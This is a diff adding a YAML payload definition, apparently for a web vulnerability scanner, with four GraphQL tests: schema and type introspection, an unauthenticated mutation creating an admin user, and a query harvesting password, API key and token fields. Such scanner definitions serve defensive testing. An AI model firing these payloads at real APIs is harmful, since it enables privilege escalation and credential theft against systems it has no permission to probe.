@@ -1,0 +1,42 @@
+id: graphql-intro
+name: GraphQL introspection and injection
+context:
+  technologies: ["GraphQL"]
+  paths: ["/graphql", "/api/graphql", "/gql"]
+
+payloads:
+  - value: "{\"query\":\"{__schema{types{name fields{name}}}}\"}"
+    detect: { body_contains: "__schema" }
+    id: graphql-intro-01
+    title: "GraphQL — introspection enabled (full schema disclosure)"
+    severity: medium
+    cwe: CWE-200
+    inject_as: body
+    content_type: application/json
+
+  - value: "{\"query\":\"{__type(name:\\\"User\\\"){name fields{name type{name}}}}\"}"
+    detect: { body_contains: "fields" }
+    id: graphql-type-01
+    title: "GraphQL — type introspection (User model exposed)"
+    severity: medium
+    cwe: CWE-200
+    inject_as: body
+    content_type: application/json
+
+  - value: "{\"query\":\"mutation{createUser(input:{email:\\\"test@cyweb.test\\\",role:\\\"admin\\\"}){id}}\"}"
+    detect: { status_change: true }
+    id: graphql-mutation-01
+    title: "GraphQL — unauthenticated mutation (privilege escalation)"
+    severity: critical
+    cwe: CWE-862
+    inject_as: body
+    content_type: application/json
+
+  - value: "{\"query\":\"{users{id email password passwordHash apiKey token}}\"}"
+    detect: { body_regex: "password|apiKey|token" }
+    id: graphql-sensitive-01
+    title: "GraphQL — sensitive field exposure (password/apiKey/token)"
+    severity: high
+    cwe: CWE-200
+    inject_as: body
+    content_type: application/json
